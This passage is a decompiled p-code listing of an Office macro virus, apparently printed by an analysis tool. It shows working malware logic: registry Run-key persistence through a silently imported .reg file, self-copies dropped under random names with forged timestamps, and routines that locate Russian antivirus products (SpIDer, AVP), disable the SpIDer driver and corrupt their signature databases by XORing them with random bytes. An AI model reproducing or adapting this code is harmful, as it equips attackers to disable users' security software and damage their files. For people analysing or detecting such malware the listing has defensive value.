' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #249:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0000 ""
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Ld Def 
' 	Concat 
' 	LitStr 0x0014 "\Software\Microsoft\"
' 	Concat 
' 	Ld i 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #250:
' 	Ld SaveF 
' 	IfBlock 
' Line #251:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "["
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Concat 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	PrintItemNL 
' Line #252:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Ld i 
' 	ArgsLd Dis 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #253:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "["
' 	Ld k 
' 	ArgsLd Keys 0x0001 
' 	Concat 
' 	Ld Def 
' 	Concat 
' 	Ld Path 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd Ver 0x0001 
' 	Concat 
' 	Ld i 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x0006 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	ArgsLd AddId 0x0001 
' 	LitDI2 0x000B 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Choose 0x0004 
' 	Concat 
' 	Ld Sec 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	PrintItemNL 
' Line #254:
' 	Ld FNum 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Ld Lev 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "="
' 	Concat 
' 	Ld Param 
' 	Concat 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #255:
' 	EndIfBlock 
' Line #256:
' 	EndSelect 
' Line #257:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #258:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #259:
' 	Ld SaveF 
' 	IfBlock 
' Line #260:
' 	Ld FNum 
' 	Sharp 
' 	Close 0x0001 
' Line #261:
' 	Ld temp 
' 	LitStr 0x0003 "DLL"
' 	ArgsLd RCy 0x0002 
' 	St Use 
' Line #262:
' 	Ld temp 
' 	ArgsCall Kill 0x0001 
' Line #263:
' 	Ld Use 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #264:
' 	LitStr 0x000F "Regedit.exe /s "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Use 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitDI2 0x0002 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	LitDI2 0x0014 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000F "LoadPowerConfig"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #265:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Regedit.exe /s "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Use 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitDI2 0x0001 
' 	ArgsLd Keys 0x0001 
' 	Ld Path 
' 	LitDI2 0x0014 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	LitStr 0x0017 "Windows\CurrentVersion\"
' 	Concat 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000D "SystemControl"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' 	EndIf 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	EndWith 
' Line #269:
' 	EndSub 
' Line #270:
' 	FuncDefn (Private Function GDs(id_FFFE As String) As String)
' Line #271:
' 	Dim (Const) 
' 	LitStr 0x0002 ":\"
' 	VarDefn Rt
' Line #272:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #273:
' 	Dim 
' 	VarDefn St (As String)
' Line #274:
' 	Dim 
' 	VarDefn i (As Byte)
' Line #275:
' 	OnError (Resume Next) 
' Line #276:
' 	Ld Friend 
' 	St FileNum 
' Line #277:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	For 
' Line #278:
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rt 
' 	Concat 
' 	LitDI2 0x0060 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St St 
' Line #279:
' 	Ld St 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #280:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #281:
' 	Ld St 
' 	ArgsCall Kill 0x0001 
' Line #282:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld GDs 
' 	LitDI2 0x0042 
' 	Ld i 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St GDs 
' 	Else 
' 	BoSImplicit 
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' 	EndIf 
' Line #283:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #284:
' 	EndFunc 
' Line #285:
' 	FuncDefn (Private Sub SUt(X As Boolean, AppClass As Byte))
' Line #286:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	VarDefn Cls (As String)
' Line #287:
' 	LitStr 0x0007 "OpusApp"
' 	LitDI2 0x0001 
' 	ArgsSt Cls 0x0001 
' Line #288:
' 	LitStr 0x0006 "XLMAIN"
' 	LitDI2 0x0002 
' 	ArgsSt Cls 0x0001 
' Line #289:
' 	LitStr 0x000E "PP97FrameClass"
' 	LitDI2 0x0003 
' 	ArgsSt Cls 0x0001 
' Line #290:
' 	LitStr 0x0005 "OMain"
' 	LitDI2 0x0004 
' 	ArgsSt Cls 0x0001 
' Line #291:
' 	Dim 
' 	VarDefn hwnd (As Long)
' Line #292:
' 	Dim 
' 	VarDefn Ret (As Long)
' Line #293:
' 	OnError (Resume Next) 
' Line #294:
' 	Ld X 
' 	SelectCase 
' Line #295:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #296:
' 	Ld AppClass 
' 	ArgsLd Cls 0x0001 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd FWBC 0x0002 
' 	St hwnd 
' Line #297:
' 	Ld hwnd 
' 	ArgsLd LWU 0x0001 
' 	St Ret 
' Line #298:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #299:
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd LWU 0x0001 
' 	St Ret 
' Line #300:
' 	EndSelect 
' Line #301:
' 	EndSub 
' Line #302:
' 	FuncDefn (Private Function RCy(Sours As String, Ext As String, id_FFFE As String) As String)
' Line #303:
' 	Dim 
' 	VarDefn Fls (As String)
' 	VarDefn DirR (As String)
' Line #304:
' 	Dim 
' 	VarDefn k (As Long)
' 	VarDefn Er (As Integer)
' 	VarDefn A (As Integer)
' Line #305:
' 	OnError YYY 
' Line #306:
' 	Do 
' Line #307:
' 	Ld GDs 
' 	St Fls 
' Line #308:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	ArgsLd RnDr 0x0001 
' 	St DirR 
' Line #309:
' 	Ld DirR 
' 	LitStr 0x0003 "*.*"
' 	ArgsLd RFe 0x0002 
' 	St Fls 
' Line #310:
' 	Ld Er 
' 	LitDI2 0x0001 
' 	Add 
' 	St Er 
' Line #311:
' 	Ld Er 
' 	LitDI2 0x000A 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #312:
' 	Ld Fls 
' 	LitStr 0x0000 ""
' 	Ne 
' 	LoopUntil 
' Line #313:
' 	LitDI2 0x0001 
' 	Ld Fls 
' 	LitStr 0x0001 "."
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St k 
' Line #314:
' 	Ld k 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #315:
' 	Ld Fls 
' 	Ld Fls 
' 	FnLen 
' 	Ld Fls 
' 	FnLen 
' 	Ld k 
' 	Sub 
' 	Paren 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St Fls 
' Line #316:
' 	EndIfBlock 
' Line #317:
' 	Ld Fls 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld Ext 
' 	Concat 
' 	St Fls 
' Line #318:
' 	Ld DirR 
' 	Ld Fls 
' 	Concat 
' 	St DirR 
' Line #319:
' 	Ld DirR 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #320:
' 	LitDI2 0x0001 
' 	St A 
' Line #321:
' 	Ld DirR 
' 	ArgsLd GetAttr 0x0001 
' 	St Er 
' Line #322:
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #323:
' 	EndIfBlock 
' Line #324:
' 	Ld DirR 
' 	St RCy 
' Line #325:
' 	Ld Sours 
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsLd CF& 0x0003 
' 	St k 
' Line #326:
' 	Ld DirR 
' 	LitDI2 0x0000 
' 	ArgsCall RTm 0x0002 
' Line #327:
' 	Ld A 
' 	If 
' 	BoSImplicit 
' 	Ld DirR 
' 	Ld Er 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #328:
' 	Label YYY 
' Line #329:
' 	EndFunc 
' Line #330:
' 	FuncDefn (Private Sub DFe(Path As String))
' Line #331:
' 	Dim 
' 	VarDefn Attr (As Integer)
' Line #332:
' 	Dim 
' 	VarDefn Siz (As Long)
' 	VarDefn Cmp (As Long)
' Line #333:
' 	Dim 
' 	VarDefn FileNum (As Integer)
' Line #334:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #335:
' 	Dim 
' 	VarDefn Ofs (As Byte)
' Line #336:
' 	OnError Ends 
' Line #337:
' 	Ld Path 
' 	ArgsLd FileLen 0x0001 
' 	St Siz 
' Line #338:
' 	Ld Siz 
' 	LitDI2 0x000B 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #339:
' 	Ld Path 
' 	ArgsLd GetAttr 0x0001 
' 	St Attr 
' Line #340:
' 	Ld Path 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #341:
' 	Ld Path 
' 	LitDI2 0x0002 
' 	ArgsCall RTm 0x0002 
' Line #342:
' 	Ld Friend 
' 	St FileNum 
' Line #343:
' 	Ld Path 
' 	Ld FileNum 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #344:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0009 
' 	St Ofs 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St Ofs 
' 	EndIf 
' Line #345:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Siz 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	GetRec 
' Line #346:
' 	Ld Siz 
' 	Ld Cmp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #347:
' 	Ld Siz 
' 	St Cmp 
' Line #348:
' 	Ld Siz 
' 	LitDI2 0x7FFB 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x7FFB 
' 	St Siz 
' 	EndIf 
' Line #349:
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	RedimAs Buf 0x0001 (As Byte)
' Line #350:
' 	LitDI2 0x0064 
' 	UMi 
' 	Paren 
' 	ArgsCall Rnd 0x0001 
' Line #351:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	GetRec 
' Line #352:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Siz 
' 	For 
' Line #353:
' 	Ld i 
' 	ArgsLd Buf 0x0001 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Add 
' 	FnInt 
' 	Xor 
' 	Ld i 
' 	ArgsSt Buf 0x0001 
' Line #354:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #355:
' 	Ld FileNum 
' 	Sharp 
' 	LitDI2 0x000A 
' 	Ld Buf 
' 	PutRec 
' Line #356:
' 	Ld Cmp 
' 	Ld Ofs 
' 	Add 
' 	St Cmp 
' Line #357:
' 	Ld FileNum 
' 	Sharp 
' 	Ld Cmp 
' 	Ld Ofs 
' 	Sub 
' 	Ld Cmp 
' 	PutRec 
' Line #358:
' 	Ld FileNum 
' 	Sharp 
' 	Close 0x0001 
' Line #359:
' 	Ld Path 
' 	LitDI2 0x0001 
' 	ArgsCall RTm 0x0002 
' Line #360:
' 	Ld Path 
' 	Ld Attr 
' 	ArgsCall SetAttr 0x0002 
' Line #361:
' 	Label Ends 
' Line #362:
' 	EndSub 
' Line #363:
' 	FuncDefn (Private Sub ASD())
' Line #364:
' 	Dim (Const) 
' 	LitStr 0x002E "\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
' 	VarDefn Path1
' Line #365:
' 	Dim (Const) 
' 	LitStr 0x002D "\System\CurrentControlSet\Services\VxD\SpIDer"
' 	VarDefn Path2
' Line #366:
' 	Dim (Const) 
' 	LitStr 0x0012 "HKEY_LOCAL_MACHINE"
' 	VarDefn Key
' Line #367:
' 	Dim (Const) 
' 	LitStr 0x000A "RUNDLL.EXE"
' 	VarDefn RN
' Line #368:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	VarDefn Ext (As String)
' Line #369:
' 	LitStr 0x0005 "*.EXE"
' 	LitDI2 0x0001 
' 	ArgsSt Ext 0x0001 
' Line #370:
' 	LitStr 0x0005 "*.DLL"
' 	LitDI2 0x0002 
' 	ArgsSt Ext 0x0001 
' Line #371:
' 	Dim 
' 	VarDefn New (As String)
' Line #372:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn k (As Integer)
' Line #373:
' 	Dim 
' 	VarDefn ProgPath (As String)
' Line #374:
' 	OnError (Resume Next) 
' Line #375:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #376:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #377:
' 	Ld i 
' 	SelectCase 
' Line #378:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #379:
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St New 
' Line #380:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #381:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St New 
' Line #382:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #383:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St New 
' Line #384:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #385:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0008 " Service"
' 	Concat 
' 	St New 
' Line #386:
' 	EndSelect 
' Line #387:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #388:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	LitStr 0x0008 "Services"
' 	Concat 
' 	Ld New 
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St ProgPath 
' Line #389:
' 	ElseBlock 
' Line #390:
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld New 
' 	ArgsMemLdWith PrivateProfileString 0x0003 
' 	St ProgPath 
' Line #391:
' 	EndIfBlock 
' Line #392:
' 	Ld ProgPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld ProgPath 
' 	Ld RN 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #393:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #394:
' 	Ld RN 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	LitStr 0x0008 "Services"
' 	Concat 
' 	Ld New 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #395:
' 	ElseBlock 
' Line #396:
' 	Ld RN 
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path1 
' 	Concat 
' 	Ld New 
' 	ArgsMemStWith PrivateProfileString 0x0003 
' Line #397:
' 	EndIfBlock 
' Line #398:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "*IOS"
' 	LitStr 0x0000 ""
' 	Ld Key 
' 	Ld Path2 
' 	Concat 
' 	LitStr 0x0009 "StaticVxD"
' 	ArgsMemStWith PrivateProfileString 0x0003 
' 	EndIf 
' Line #399:
' 	Ld ProgPath 
' 	ArgsLd PTD 0x0001 
' 	St ProgPath 
' Line #400:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #401:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "*.VDB"
' 	LitDI2 0x0003 
' 	ArgsSt Ext 0x0001 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0005 "*.AVC"
' 	LitDI2 0x0003 
' 	ArgsSt Ext 0x0001 
' 	EndIf 
' Line #402:
' 	Ld ProgPath 
' 	Ld k 
' 	ArgsLd Ext 0x0001 
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Dir 0x0002 
' 	St New 
' Line #403:
' 	Ld New 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	DoWhile 
' Line #404:
' 	Ld ProgPath 
' 	Ld New 
' 	Concat 
' 	ArgsCall DFe 0x0001 
' Line #405:
' 	Ld Dir 
' 	St New 
' Line #406:
' 	Loop 
' Line #407:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #408:
' 	EndIfBlock 
' Line #409:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #410:
' 	EndWith 
' Line #411:
' 	EndSub 
' Line #412:
' 	FuncDefn (Private Sub RTm(FName As String, Md As Byte))
' Line #413:
' 	Dim 
' 	VarDefn hF (As Long)
' 	VarDefn i (As Byte)
' 	VarDefn Yr (As Integer)
' 	VarDefn Mn (As Integer)
' 	VarDefn CurYr (As Integer)
' Line #414:
' 	Dim 
' 	VarDefn St (As STM)
' Line #415:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	VarDefn DT (As type_000013E0)
' Line #416:
' 	OnError (Resume Next) 
' Line #417:
' 	Ld FName 
' 	LitHI4 0x0000 0xC000 
' 	LitDI4 0x0003 0x0000 
' 	LitDI4 0x0000 0x0000 
' 	ParamByVal 
' 	LitDI4 0x0003 0x0000 
' 	LitHI4 0x0080 0x1000 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd CrF 0x0007 
' 	St hF 
' Line #418:
' 	Ld hF 
' 	LitDI2 0x0001 
' 	ArgsLd DT 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd DT 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd DT 0x0001 
' 	ArgsCall (Call) GFT 0x0004 
' Line #419:
' 	Ld Md 
' 	SelectCase 
' Line #420:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #421:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x0008 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Add 
' 	St Yr 
' Line #422:
' 	Ld St 
' 	MemLd wMonth 
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Eq 
' 	St Mn 
' Line #423:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St CurYr 
' Line #424:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #425:
' 	Ld i 
' 	ArgsLd DT 0x0001 
' 	Ld St 
' 	ArgsCall (Call) FTTST 0x0002 
' Line #426:
' 	Ld Yr 
' 	Ld St 
' 	MemSt wYear 
' Line #427:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld St 
' 	MemLd wYear 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CurYr 
' 	Ld St 
' 	MemSt wMonth 
' 	Else 
' 	BoSImplicit 
' 	Ld Mn 
' 	Ld St 
' 	MemSt wMonth 
' 	EndIf 
' Line #428:
' 	Ld St 
' 	Ld i 
' 	ArgsLd DT 0x0001 
' 	ArgsCall (Call) STTFT 0x0002 
' Line #429:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #430:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #431:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #432:
' 	Ld i 
' 	ArgsLd DT 0x0001 
' 	MemLd dwLowDateTime 
' 	LitDI2 0x03E8 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x2710 
' 	Add 
' 	FnInt 
' 	Add 
' 	Ld i 
' 	ArgsLd DT 0x0001 
' 	MemSt dwLowDateTime 
' Line #433:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #434:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #435:
' 	Ld hF 
' 	ArgsCall (Call) CHl 0x0001 
' Line #436:
' 	ExitSub 
' Line #437:
' 	EndSelect 
' Line #438:
' 	Ld hF 
' 	LitDI2 0x0001 
' 	ArgsLd DT 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd DT 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd DT 0x0001 
' 	ArgsCall (Call) SFT 0x0004 
' Line #439:
' 	Ld hF 
' 	ArgsCall (Call) CHl 0x0001 
' Line #440:
' 	EndSub 
' Line #441:
' 	FuncDefn (Private Function PTD(Path As String, id_FFFE As String) As String)
' Line #442:
' 	Dim 
' 	VarDefn tmp (As String)
' Line #443:
' 	Dim 
' 	VarDefn i (As Long)
' 	VarDefn k (As Long)
' Line #444:
' 	OnError Sti 
' Line #445:
' 	Ld Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Sti 
' 	EndIf 
' Line #446:
' 	Ld Path 
' 	FnLen 
' 	St k 
' Line #447:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld k 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #448:
' 	Ld Path 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #449:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #450:
' 	Ld Path 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	St PTD 
' Line #451:
' 	ExitFunc 
' Line #452:
' 	Label Sti 
' Line #453:
' 	LitStr 0x0000 ""
' 	St PTD 
' Line #454:
' 	EndFunc 
' Line #455:
' 	FuncDefn (Private Sub AWd())
' Line #456:
' 	Dim (Const) 
' 	LitStr 0x0011 "HKEY_CLASSES_ROOT"
' 	VarDefn Key
' Line #457:
' 	Dim 
' 	VarDefn S (As String)
' 	VarDefn i (As Byte)
' Line #458:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	VarDefn Ext (As String)
' Line #459:
' 	LitStr 0x0003 "wri"
' 	LitDI2 0x0001 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "diz"
' 	LitDI2 0x0002 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "nfo"
' 	LitDI2 0x0003 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "cnt"
' 	LitDI2 0x0004 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "log"
' 	LitDI2 0x0005 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "me"
' 	LitDI2 0x0006 
' 	ArgsSt Ext 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "1st"
' 	LitDI2 0x0007 
' 	ArgsSt Ext 0x0001 
' Line #460:
' 	OnError (Resume Next) 
' Line #461:
' 	StartWithExpr 
' 	Ld System 
' 	With 
' Line #462:
